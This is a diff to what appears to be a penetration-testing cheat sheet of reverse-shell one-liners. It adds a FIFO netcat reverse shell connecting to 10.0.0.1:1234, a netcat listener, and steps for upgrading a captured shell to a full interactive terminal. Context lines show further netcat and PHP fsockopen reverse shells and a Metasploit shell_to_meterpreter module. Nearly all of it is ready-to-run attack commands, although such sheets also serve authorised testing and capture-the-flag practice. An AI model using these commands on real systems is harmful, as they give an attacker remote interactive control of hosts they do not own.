@@ -4,6 +4,12 @@
 
 ### Shell
 
+Using FIFO
+
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+```
+
 ```
 nc -c '/bin/bash -c "script /dev/null"' 127.0.0.1 1337
 ```
@@ -32,6 +38,11 @@ php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 #### General Listener
 
+Basic Listener, useful with upgrading
+```
+nc -vvlp 1337
+```
+
 ```
 stty -echo raw; nc -lp 1337; stty sane
 ```
@@ -47,9 +58,13 @@ nc -l -p 4444 -s 127.0.0.1
 
 ### Shell
 
-```
-stty raw -echo && fg %1
-```
+- Use bash, not zsh
+- In reverse shell: Execute bash (for example using the Python method below)
+- In reverse shell: `export TERM=xterm-256color`
+- Switch to background with CTRL+Z
+- Configure local shell: `stty raw -echo`
+- Execute `fg`
+- In reverse shell: `reset`
 
 ### Python
 ```
@@ -67,4 +82,4 @@ use post/multi/manage/shell_to_meterpreter
 
 - [Pentest Monkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 - [xl7dev](http://blog.safebuff.com/2016/06/19/Reverse-shell-Cheat-Sheet/)
-
+- [Shell upgrading](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
